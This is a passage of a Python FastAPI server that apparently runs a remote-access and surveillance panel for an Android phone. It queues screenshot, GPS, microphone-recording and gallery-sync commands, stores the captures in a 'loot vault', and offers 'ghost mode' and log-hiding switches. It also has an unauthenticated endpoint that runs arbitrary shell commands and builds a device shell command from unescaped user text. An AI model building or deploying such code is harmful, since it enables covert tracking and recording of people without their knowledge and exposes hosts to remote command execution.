        goal = data.get("goal", "")
        if not goal:
            return {"success": False, "reason": "Goal cannot be empty"}
        
        from skill_synthesizer import SkillSynthesizer
        synth = SkillSynthesizer()
        # Jalankan secara sinkron (UI akan menunggu)
        # Untuk performa lebih baik bisa pakai background_tasks + polling, tapi ini lebih sederhana
        result = synth.synthesize_new_skill(goal)
        return result
    except Exception as e:
        return {"success": False, "reason": str(e)}

@app.post("/api/ghost/toggle")
async def api_ghost_toggle(request: Request):
    try:
        data = await request.json()
        active = data.get("active", False)
        
        from ghost_mode import GhostMode
        GhostMode.toggle(active)
        
        return {"success": True, "active": active}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.get("/api/skills")
async def get_skills():
    """Neural Skill Matrix: Real-time capability visualization."""
    return {
        "active": [
            "🛡️ Aegis Interception v2.0",
            "👁️ Vision Sentinel v18.5",
            "🔊 Voice Link v19.5",
            "🧬 Neural Mesh Handshake v19.6",
            "🧩 Local AI Reasoning (TinyLlama)"
        ],
        "learning": ["Autonomous Multi-Device Orchestration", "Dynamic Skill Integration"],
        "growth": "99.8%",
        "status": "ELITE_SOVEREIGN"
    }

@app.get("/api/neural-map/data")
async def get_neural_map_data():
    """Mengambil data 3D Node dari memori & infrastruktur."""
    nodes = [
        {"id": "brain", "group": "core", "label": "Brain Engine", "val": 20},
        {"id": "mobile", "group": "device", "label": "Redmi Note 14", "val": 15},
        {"id": "vps", "group": "device", "label": "Alibaba Cloud", "val": 15},
        {"id": "gateway", "group": "network", "label": "Secure Gateway", "val": 10},
    ]
    # Add 12 Pillars
    pillars = [
        "neural_coder", "security_sentinel", "pentester", "knowledge_absorber", 
        "neural_architect", "network_sentinel", "auto_healer", "memory_consolidator",
        "antigravity", "strategist", "qa_validator", "ux_weaver",
        "self_evaluation", "ghost_mirror", "forensic_pathologist", "hardware_optimizer",
        "linguistic_synthesis", "offensive_predator", "grand_singularity"
    ]
    for p in pillars:
        nodes.append({"id": p, "group": "pilar", "label": p.replace('_', ' ').title(), "val": 8})
    
    links = [
        {"source": "vps", "target": "brain"},
        {"source": "gateway", "target": "vps"},
        {"source": "mobile", "target": "gateway"},
        {"source": "mobile", "target": "brain"}
    ]
    for p in pillars:
        links.append({"source": p, "target": "brain"})
    
    # Extract temporal memory to populate nodes
    try:
        if memory and hasattr(memory, "memory"):
            mem_data = memory.memory
            count = 1
            for ts, entries in list(mem_data.items())[-5:]:  # Limit to latest 5 days
                for entry in entries[:3]: # Limit to 3 per day
                    node_id = f"mem_{count}"
                    nodes.append({"id": node_id, "group": "memory", "label": entry.get('action', 'thought'), "val": 5})
                    links.append({"source": node_id, "target": "brain"})
                    count += 1
    except Exception as e:
            log.debug(f"Silent error suppressed: {e}")

    return {"nodes": nodes, "links": links}

@app.get("/api/swarm/bus")
async def get_swarm_bus():
    try:
        from swarm_protocol import SwarmBlackboard
        if not os.path.exists(SwarmBlackboard.PATH):
            return {"messages": []}
        with open(SwarmBlackboard.PATH, "r") as f:
            return json.load(f)
    except ImportError:
        return {"messages": []}

@app.get("/api/agent-task")
async def get_agent_task():
    """Expose current AI agent auto-connection task status to dashboard."""
    cf_up = _cf_is_reachable()
    agent_online = _agent_is_online()
    agent_data = local_state["agents"].get("REDMI_NOTE_14", {})
    return {
        "task": "AUTO_CONNECTION_GUARDIAN",
        "status": "ONLINE" if agent_online else "SEARCHING",
        "cloudflare_up": cf_up,
        "vps_direct_link": agent_online,
        "last_seen_ago": round(time.time() - agent_data.get("last_seen", 0)) if agent_data else None,
        "active_route": "CLOUDFLARE" if (cf_up and agent_online) else ("DIRECT_VPS" if agent_online else "SEVERED")
    }

@app.get("/download-apk")
async def download_apk():
    search_dirs = [
        os.path.join(os.path.dirname(BASE_DIR), "bin"),
        os.path.join(os.path.dirname(BASE_DIR), "mobile_app", "bin"),
        os.path.join(BASE_DIR, "bin")
    ]
    apk_path = None
    for d in search_dirs:
        if os.path.exists(d):
            import glob
            apks = glob.glob(os.path.join(d, "*.apk"))
            if apks:
                apks.sort(key=os.path.getmtime, reverse=True)
                apk_path = apks[0]
                break
    if apk_path and os.path.exists(apk_path):
        from fastapi.responses import FileResponse
        return FileResponse(apk_path, media_type="application/vnd.android.package-archive", filename=os.path.basename(apk_path))
    return Response(content="⚠️ Build Artifact Not Ready.", status_code=404)

# =============================================================================
# PC AUTONOMOUS CONTROL ENDPOINTS (V21.1)
# =============================================================================

@app.get("/api/pc/stats")
async def get_pc_stats():
    if not PCExecutor:
        return {"success": False, "error": "PC Executor not initialized."}
    return PCExecutor.get_system_stats()

@app.post("/api/pc/command")
async def pc_command(request: Request):
    if not PCExecutor:
        return {"success": False, "error": "PC Executor not initialized."}
    data = await request.json()
    cmd = data.get("cmd")
    if not cmd:
        return {"success": False, "error": "No command provided."}
    return PCExecutor.run_shell(cmd)

@app.get("/api/pc/knowledge")
async def get_pc_knowledge(category: str = "general"):
    if not PCExecutor:
        return {"success": False, "error": "PC Executor not initialized."}
    return PCExecutor.read_knowledge(category=category)

@app.get("/api/pc/logs")
async def get_pc_logs():
    if not PCExecutor:
        return []
    return PCExecutor.get_logs()

@app.post("/api/pc/override")
async def set_pc_override(request: Request):
    if not PCExecutor:
        return {"success": False, "error": "PC Executor not initialized."}
    data = await request.json()
    state = data.get("state", False)
    PCExecutor.toggle_override(state)
    return {"success": True, "override": PCExecutor.SOVEREIGN_OVERRIDE}

# =============================================================================
# BUILD & UPGRADE ENDPOINTS (V21.1)
# =============================================================================

@app.post("/api/build/trigger")
async def trigger_build():
    try:
        from build_manager import BuildManager
        return BuildManager.trigger_apk_build()
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.get("/api/build/status")
async def get_build_status():
    try:
        from build_manager import BuildManager
        return BuildManager.check_build_status()
    except Exception as e:
        return {"success": False, "error": str(e)}

# =============================================================================
# NEURAL HUB & AI BRAIN ENDPOINTS (V21.0 AEGIS — Multi-Provider)
# =============================================================================
# NOTE: Old single-provider brain_chat removed. Using brain_chat_v2 below.

@app.get("/api/brain/status")
async def brain_status():
    return {
        "memory_size": 0,
        "skills": ["Aegis", "Vision", "Voice", "Mesh", "RAG", "Local NLU"],
        "local_brain": "ACTIVE",
        "uptime": time.time()
    }


# ── NEW: Chat History & Relay ──────────────────────────
_chat_history = []

# ── MULTI-PROVIDER AI ENGINE (V21.0 AEGIS) ──────────────
_SYSTEM_PROMPT = (
    "You are Noir Sovereign, an ELITE AI ARCHITECT and Master Programmer controlling an Android device (Redmi Note 14). "
    "You possess advanced knowledge in Clean Code, SOLID principles, and System Security. "
    "Your capabilities: screenshot, GPS tracking, shell commands, camera, audio recording, app control, and autonomous system evolution. "
    "Answer concisely. If the user asks you to perform a device action, mention it clearly. "
    "Always respond in the same language as the user (Indonesian or English)."
)

async def _try_groq(prompt: str, history: list) -> str | None:
    """Provider 1: Groq — Free, ultra-fast, llama-3.3-70b"""
    key = os.environ.get("GROQ_API_KEY", "")
    if not key:
        return None
    messages = [{"role": "system", "content": _SYSTEM_PROMPT}]
    for h in history[-6:]:  # last 3 exchanges
        messages.append({"role": h["role"], "content": h["msg"]})
    messages.append({"role": "user", "content": prompt})
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.groq.com/openai/v1/chat/completions",
                headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
                json={"model": "llama-3.3-70b-versatile", "messages": messages, "max_tokens": 1024, "temperature": 0.7},
                timeout=20.0
            )
            if r.status_code == 200:
                return r.json()["choices"][0]["message"]["content"]
            err_msg = f"[GROQ] HTTP {r.status_code}: {r.text[:200]}"
            print(err_msg)
            local_state["logs"].append({"device_id": "SYSTEM", "message": err_msg, "level": "ERROR", "ts": time.time()})
    except Exception as e:
        err_msg = f"[GROQ] Error: {e}"
        print(err_msg)
        local_state["logs"].append({"device_id": "SYSTEM", "message": err_msg, "level": "ERROR", "ts": time.time()})
    return None

async def _try_gemini(prompt: str, model: str = "gemini-1.5-flash") -> str | None:
    """Provider 2/3: Gemini API — Flash then Pro"""
    key = os.environ.get("GEMINI_API_KEY", "")
    if not key:
        return None
    try:
        async with httpx.AsyncClient() as client:
            # Try v1beta instead of v1 for better compatibility with 1.5 models
            r = await client.post(
                f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key}",
                json={"contents": [{"parts": [{"text": f"{_SYSTEM_PROMPT}\n\nUser: {prompt}"}]}],
                      "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.7}},
                timeout=20.0
            )
            if r.status_code == 200:
                return r.json()["candidates"][0]["content"]["parts"][0]["text"]
            err_msg = f"[GEMINI/{model}] HTTP {r.status_code}: {r.text[:200]}"
            print(err_msg)
            local_state["logs"].append({"device_id": "SYSTEM", "message": err_msg, "level": "ERROR", "ts": time.time()})
    except Exception as e:
        err_msg = f"[GEMINI/{model}] Error: {e}"
        print(err_msg)
        local_state["logs"].append({"device_id": "SYSTEM", "message": err_msg, "level": "ERROR", "ts": time.time()})
    return None

async def _try_openrouter(prompt: str) -> str | None:
    """Provider 4: OpenRouter — Free tier (mistral-7b, llama-3 etc)"""
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        return None
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://openrouter.ai/api/v1/chat/completions",
                headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json",
                         "HTTP-Referer": "https://noir-sovereign.ai", "X-Title": "Noir Sovereign"},
                json={"model": "mistralai/mistral-7b-instruct:free",
                      "messages": [{"role": "system", "content": _SYSTEM_PROMPT}, {"role": "user", "content": prompt}],
                      "max_tokens": 1024},
                timeout=20.0
            )
            if r.status_code == 200:
                return r.json()["choices"][0]["message"]["content"]
            print(f"[OPENROUTER] HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"[OPENROUTER] Error: {e}")
    return None

def _local_intelligence(prompt: str) -> str:
    """Provider 5: Local rule-based fallback — always available."""
    p = prompt.lower()
    if any(w in p for w in ["screenshot", "capture", "layar", "tangkap"]):
        return "Baik, saya akan mengambil screenshot layar Redmi Note 14 sekarang."
    elif any(w in p for w in ["lokasi", "gps", "location", "posisi"]):
        return "Mengambil data lokasi GPS dari perangkat..."
    elif any(w in p for w in ["gallery", "foto", "galeri", "gambar"]):
        return "Menyinkronkan galeri dari Redmi Note 14 ke Loot Vault..."
    elif any(w in p for w in ["audio", "rekam", "record", "suara"]):
        return "Memulai rekaman audio dari mikrofon perangkat..."
    elif any(w in p for w in ["status", "kondisi", "health"]):
        return "Sistem Noir Sovereign V21.0 AEGIS aktif. Semua modul: Vision Sentinel, Aegis Guardian, Neural Mesh — ONLINE."
    elif any(w in p for w in ["halo", "hello", "hi", "hey", "hai"]):
        return "Salam. Saya Noir Sovereign AI Agent V21.0 AEGIS. Siap menerima perintah Anda."
    else:
        return (f"Perintah '{prompt[:50]}' diterima dan telah masuk antrean. "
                "Saat ini AI API (Groq/Gemini) sedang mencapai batas rate limit harian (Limit Tercapai/404). "
                "Sistem berjalan dalam mode Neural Lokal. Sinkronisasi agen tetap berjalan secara utuh.")

_active_provider = "INITIALIZING"

@app.post("/api/brain/chat")
async def brain_chat_v2(request: Request):
    """AI Chat Relay — Multi-Provider Fallback Chain V21.0 AEGIS.
    Priority: Groq → Gemini-Flash → Gemini-Pro → OpenRouter → Local
    """
    global _active_provider
    try:
        data = await request.json()
        prompt = data.get("message", "").strip()
        device_id = data.get("device_id", "REDMI_NOTE_14")
        
        # LINK-03: Update liveness on chat interaction
        if device_id not in local_state["agents"]:
            local_state["agents"][device_id] = {}
        local_state["agents"][device_id]["last_seen"] = time.time()

        if not prompt:
            return {"response": "Perintah kosong.", "status": "ok", "provider": "N/A"}

        response_text = None
        provider_used = "local"

        # ── Chain: Try each provider in order ──
        r = await _try_groq(prompt, _chat_history)
        if r:
            response_text = r
            provider_used = "Groq / LLaMA-3.3-70b"

        if not response_text:
            r = await _try_gemini(prompt, "gemini-1.5-flash")
            if r:
                response_text = r
                provider_used = "Gemini 1.5 Flash"

        if not response_text:
            r = await _try_gemini(prompt, "gemini-1.0-pro")
            if r:
                response_text = r
                provider_used = "Gemini 1.0 Pro"

        if not response_text:
            r = await _try_openrouter(prompt)
            if r:
                response_text = r
                provider_used = "OpenRouter / Mistral-7b"

        if not response_text:
            response_text = _local_intelligence(prompt)
            provider_used = "Local Intelligence"

        _active_provider = provider_used
        print(f"[BRAIN] Provider: {provider_used}")

        # ── Store history ──
        _chat_history.append({"role": "user", "msg": prompt, "ts": time.strftime("%H:%M:%S")})
        _chat_history.append({"role": "assistant", "msg": response_text, "ts": time.strftime("%H:%M:%S")})
        if len(_chat_history) > 200:
            _chat_history[:] = _chat_history[-200:]

        # ── Autonomous Device Action Detection ──
        action = None
        kw_map = {
            "screenshot": "screenshot", "capture": "screenshot", "tangkap layar": "screenshot",
            "lokasi": "location", "gps": "location", "location": "location",
            "vibrate": "vibrate", "getarkan": "vibrate",
            "gallery": "gallery_sync", "galeri": "gallery_sync",
            "audio": "audio_record", "rekam": "audio_record"
        }
        for kw, atype in kw_map.items():
            if kw in prompt.lower():
                action = {"type": atype}
                cmd_id = f"AI_{hex(int(time.time()))[2:].upper()}"
                with _commands_lock:
                    local_state["commands"].append({
                        "command_id": cmd_id,  # BUG-FIX: was 'id', APK reads 'command_id'
                        "action": action, "status": "pending",
                        "target": device_id,
                        "description": f"AI Chat triggered: {atype}"
                    })
                break

        return {
            "response": response_text,
            "status": "success",
            "provider": provider_used,
            "autonomous_action": action
        }

    except Exception as e:
        return {"response": f"System Error: {str(e)}", "status": "error", "provider": "error"}

@app.get("/api/brain/provider")
async def get_active_provider():
    """Returns which AI provider is currently active."""
    return {"provider": _active_provider}


@app.get("/api/chat/history")
async def get_chat_history():
    return {"history": _chat_history[-50:]}

# ── NEW: Evolution Proposals ──────────────────────────
@app.get("/api/evolutions")
async def get_evolutions():
    """Return all evolution proposals and history."""
    from evolution_engine import evolution_engine
    return evolution_engine.get_all_evolutions()

@app.post("/api/evolution/approve")
async def approve_evolution(request: Request):
    data = await request.json()
    eid = data.get("id")
    from evolution_engine import evolution_engine
    success = evolution_engine.approve_evolution(eid)
    return {"success": success}

@app.post("/api/evolution/reject")
async def reject_evolution(request: Request):
    data = await request.json()
    eid = data.get("id")
    from evolution_engine import evolution_engine
    success = evolution_engine.reject_evolution(eid)
    return {"success": success}

# ── NEW: Autonomous Browser Control ───────────────────
@app.post("/api/browser/goto")
async def browser_goto(request: Request):
    data = await request.json()
    url = data.get("url")
    if not url: return {"success": False, "error": "URL required"}
    from autonomous_browser import AutonomousBrowser
    result = await AutonomousBrowser.navigate_to(url)
    return result

@app.get("/api/browser/view")
async def browser_view():
    from autonomous_browser import AutonomousBrowser
    return AutonomousBrowser.get_last_view()

# ── NEW: Log Visibility Control ───────────────────────
_log_visibility = {"visible": True}

@app.post("/api/log-visibility")
async def set_log_visibility(request: Request):
    data = await request.json()
    _log_visibility["visible"] = data.get("visible", True)
    cmd_id = f"LOG_{hex(int(time.time()))[2:].upper()}"
    with _commands_lock:
        local_state["commands"].append({
            "command_id": cmd_id,
            "action": {"type": "log_visibility", "visible": _log_visibility["visible"]},
            "status": "pending",
            "target": "REDMI_NOTE_14"
        })
    return {"ok": True, "visible": _log_visibility["visible"]}

# ── NEW: PC Bridge (ADB Gateway) ───────────────────────
active_pc_bridges = {} # device_id -> websocket

@app.websocket("/ws/pc-bridge")
async def websocket_pc_bridge(websocket: WebSocket, device_id: str = "REDMI_NOTE_14"):
    await websocket.accept()
    active_pc_bridges[device_id] = websocket
    print(f"[WS] PC Bridge for {device_id} connected")
    try:
        while True:
            data = await websocket.receive_text()
            # Bridge might send results back
            payload = json.loads(data)
            if payload.get("type") == "result":
                # Handle results if needed
                pass
    except WebSocketDisconnect:
        print(f"[WS] PC Bridge for {device_id} disconnected")
        if device_id in active_pc_bridges:
            del active_pc_bridges[device_id]

@app.post("/api/agent/remote-control")
async def remote_control(request: Request):
    """Send interactive commands to Agent OR PC Bridge."""
    data = await request.json()
    action_type = data.get("action")
    params = data.get("params", {})
    target_device = "REDMI_NOTE_14"
    
    shell_cmd = ""
    if action_type == "tap":
        shell_cmd = f"input tap {params.get('x')} {params.get('y')}"
    elif action_type == "swipe":
        shell_cmd = f"input swipe {params.get('x1')} {params.get('y1')} {params.get('x2')} {params.get('y2')} {params.get('duration', 300)}"
    elif action_type == "text":
        text = params.get('text', '').replace(' ', '%s')
        shell_cmd = f"input text '{text}'"
    elif action_type == "key":
        shell_cmd = f"input keyevent {params.get('keycode')}"
    elif action_type == "refresh":
        # Use adb screencap for better quality/speed via bridge
        shell_cmd = "screencap -p /sdcard/noir_shot.png"
    
    if not shell_cmd:
        return {"ok": False, "error": "Invalid action"}
        
    cmd_id = f"REMOTE_{hex(int(time.time()))[2:].upper()}"
    cmd_payload = {
        "command_id": cmd_id,
        "action": {"type": "shell", "cmd": shell_cmd},
        "status": "pending",
        "target": target_device
    }

    # 1. Try PC Bridge first (High Reliability via ADB)
    if target_device in active_pc_bridges:
        try:
            await active_pc_bridges[target_device].send_json({"commands": [cmd_payload]})
            return {"ok": True, "method": "PC_BRIDGE", "command_id": cmd_id}
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")

    # 2. Try Direct Agent WebSocket
    if target_device in active_websockets:
        try:
            await active_websockets[target_device].send_json({"commands": [cmd_payload]})
            return {"ok": True, "method": "DIRECT_WS", "command_id": cmd_id}
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")

    # 3. Fallback to Command Queue (HTTP Polling)
    with _commands_lock:
        local_state["commands"].append(cmd_payload)
    
    return {"ok": True, "method": "POLLING", "command_id": cmd_id}

@app.post("/api/agent/upload")
async def agent_upload(
    file: UploadFile = File(...),
    device_id: str = "REDMI_NOTE_14",
    command_id: str = None,
    media_type: str = "image"
):
    """Save uploaded media from agent. Supports: image, audio. Routes to correct loot vault."""
    ts = int(time.time())
    ext = os.path.splitext(file.filename)[1] if file.filename else ".bin"
    
    if media_type == "audio":
        subdir = "audio"
        ext = ext if ext in (".wav", ".pcm", ".mp3", ".aac") else ".wav"
        mime = "audio/wav"
    else:
        subdir = "screenshots"
        ext = ext if ext in (".jpg", ".jpeg", ".png") else ".png"
        mime = "image/png"
    
    filename = f"{device_id}_{ts}{ext}"
    save_dir = os.path.join(BASE_DIR, subdir)
    os.makedirs(save_dir, exist_ok=True)
    save_path = os.path.join(save_dir, filename)
    
    content = await file.read()
    with open(save_path, "wb") as f:
        f.write(content)
    
    # Update agent state
    if device_id not in local_state["agents"]:
        local_state["agents"][device_id] = {}
    local_state["agents"][device_id]["last_seen"] = ts
    
    if media_type == "image":
        local_state["agents"][device_id]["last_screenshot"] = filename
        _latest_mirror_frame["key"] = filename
        _latest_mirror_frame["ts"]  = time.time()
    elif media_type == "audio":
        local_state["agents"][device_id]["last_audio"] = filename
    
    # Append to loot vault
    loot_entry = {
        "id": f"{subdir[:3]}_{ts}",
        "filename": filename,
        "type": media_type,
        "device_id": device_id,
        "command_id": command_id,
        "ts": ts,
        "size": len(content),
        "url": f"/{subdir}/{filename}"
    }
    local_state.setdefault("loot", []).append(loot_entry)
    # Keep loot vault to last 500 entries
    if len(local_state["loot"]) > 500:
        oldest = local_state["loot"].pop(0)
        old_path = os.path.join(BASE_DIR, oldest["type"] == "image" and "screenshots" or "audio", oldest["filename"])
        try: os.remove(old_path)
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")
    
    return {"ok": True, "filename": filename, "url": f"/{subdir}/{filename}"}


# ── Media Loot Vault API ──────────────────────────────
@app.get("/api/loot/list")
async def loot_list(type: str = "all", limit: int = 100):
    """List all captured media in the loot vault, newest first."""
    vault = local_state.get("loot", [])
    if type != "all":
        vault = [v for v in vault if v.get("type") == type]
    return {"items": list(reversed(vault[-limit:]))}


@app.delete("/api/loot/{item_id}")
async def loot_delete(item_id: str):
    """Delete a specific loot item from vault and disk."""
    vault = local_state.get("loot", [])
    target = next((v for v in vault if v.get("id") == item_id), None)
    if not target:
        return {"ok": False, "error": "Item not found"}
    
    subdir = "screenshots" if target["type"] == "image" else "audio"
    path = os.path.join(BASE_DIR, subdir, target["filename"])
    try:
        os.remove(path)
    except Exception as e:
        print(f"[LOOT] Could not delete file: {e}")
    
    local_state["loot"] = [v for v in vault if v.get("id") != item_id]
    return {"ok": True}


@app.delete("/api/loot")
async def loot_clear_all():
    """Wipe all loot vault entries and files."""
    vault = local_state.get("loot", [])
    for item in vault:
        subdir = "screenshots" if item["type"] == "image" else "audio"
        path = os.path.join(BASE_DIR, subdir, item["filename"])
        try: os.remove(path)
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")
    local_state["loot"] = []
    return {"ok": True, "deleted": len(vault)}

# ── Live Mirror Frame ─────────────────────────────────
_latest_mirror_frame = {"key": None, "width": None, "height": None, "ts": 0}

@app.get("/api/screen/frame")
async def get_screen_frame():
    """Returns the latest mirror frame metadata for the dashboard to pull."""
    # First check local agent state
    for agent in local_state["agents"].values():
        if agent.get("last_screenshot"):
            _latest_mirror_frame["key"] = agent["last_screenshot"]
            _latest_mirror_frame["ts"]  = time.time()
    # Also check CF
    if _latest_mirror_frame["key"]:
        return _latest_mirror_frame
    # Fallback: ask CF gateway for latest screenshot
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, lambda: requests.get(f"{CF_GATEWAY}/agent/summary", headers=CF_HEADERS, timeout=4).json())
        agent = result.get("agent") or {}
        shot  = agent.get("last_screenshot")
        if shot:
            _latest_mirror_frame["key"] = shot
    except Exception as e:
            log.debug(f"Silent error suppressed: {e}")
    return _latest_mirror_frame

@app.post("/api/screen/frame")
async def update_screen_frame(request: Request):
    """APK can push latest frame info here directly."""
    d = await request.json()
    _latest_mirror_frame.update(d)
    _latest_mirror_frame["ts"] = time.time()
    return {"ok": True}

# ── (Duplicate routes removed — fixed versions at lines 367 & 396) ──────────

# ── Auto-Update Trigger ───────────────────────────────
@app.post("/api/auto-update")
async def trigger_auto_update():
    """Trigger autonomous update on both APK (via command) and VPS."""
    cmd_id = f"UPD_{hex(int(time.time()))[2:].upper()}"
    with _commands_lock:
        local_state["commands"].append({
            "command_id": cmd_id,  # BUG-FIX: was 'id', APK reads 'command_id'
            "action": {"type": "auto_update"},
            "status": "pending",
            "target": "REDMI_NOTE_14",
            "description": "Dashboard-triggered auto-update"
        })
    import subprocess
    try:
        subprocess.Popen(["git", "-C", "/root/noir-agent", "pull", "origin", "main"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        log.debug(f"Silent error suppressed: {e}")
    return {"ok": True, "msg": "Auto-update command dispatched to agent and VPS."}



# ── Static File Serving ───────────────────────────────
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse

@app.get("/css/{filename}")
async def serve_css(filename: str):
    path = os.path.join(BASE_DIR, "css", filename)
    if os.path.exists(path):
        return FileResponse(path, media_type="text/css")
    return Response(status_code=404)

@app.get("/js/{filename}")
async def serve_js(filename: str):
    path = os.path.join(BASE_DIR, "js", filename)
    if os.path.exists(path):
        return FileResponse(path, media_type="application/javascript")
    return Response(status_code=404)

@app.get("/screenshots/{filename}")
async def serve_screenshot(filename: str):
    """Serve agent-uploaded screenshots to the dashboard."""
    safe_name = os.path.basename(filename)  # Prevent path traversal
    path = os.path.join(BASE_DIR, "screenshots", safe_name)
    if os.path.exists(path):
        media_type = "image/jpeg" if safe_name.endswith((".jpg", ".jpeg")) else "image/png"
        return FileResponse(path, media_type=media_type)
    return Response(status_code=404)

@app.get("/audio/{filename}")
async def serve_audio(filename: str):
    """Serve recorded audio files from the Media Loot vault."""
    safe_name = os.path.basename(filename)
    path = os.path.join(BASE_DIR, "audio", safe_name)
    if os.path.exists(path):
        mt = "audio/wav"
        if safe_name.endswith(".mp3"): mt = "audio/mpeg"
        elif safe_name.endswith(".aac"): mt = "audio/aac"
        return FileResponse(path, media_type=mt)
    return Response(status_code=404)

@app.get("/")
async def get_index():
    path = os.path.join(BASE_DIR, "index.html")
    with open(path, "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read(), headers={"Cache-Control": "no-cache, no-store, must-revalidate"})

@app.get("/neural_map.html")
async def get_neural_map():
    path = os.path.join(BASE_DIR, "neural_map.html")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return Response(status_code=404)

@app.get("/wiki.html")
async def get_wiki():
    path = os.path.join(BASE_DIR, "wiki.html")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return Response(status_code=404)

@app.get("/{filename}.html")
async def serve_html(filename: str):
    """Generic handler for any HTML file in the noir-ui directory."""
    safe_name = os.path.basename(filename)  # Prevent path traversal
    path = os.path.join(BASE_DIR, f"{safe_name}.html")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return Response(status_code=404)

@app.get("/assets/{filename:path}")
async def serve_assets(filename: str):
    path = os.path.join(BASE_DIR, "assets", filename)
    if os.path.exists(path):
        return FileResponse(path)
    return Response(status_code=404)

if __name__ == "__main__":
    import uvicorn, argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, help="Port to run the server on")
    args = parser.parse_args()

    if args.port:
        print(f"[START] Noir Sovereign v21.1 on Port {args.port}...")
        uvicorn.run(app, host="0.0.0.0", port=args.port)
    else:
        ports = [8765, 80, 8000, 5000]
        for port in ports:
            try:
                print(f"[START] Noir Sovereign v21.1 on Port {port}...")
                uvicorn.run(app, host="0.0.0.0", port=port)
                break
            except Exception as e:
                print(f"[WARN] Port {port} unavailable: {e}")
            if port == ports[-1]:
                print("[FATAL] No available ports found.")


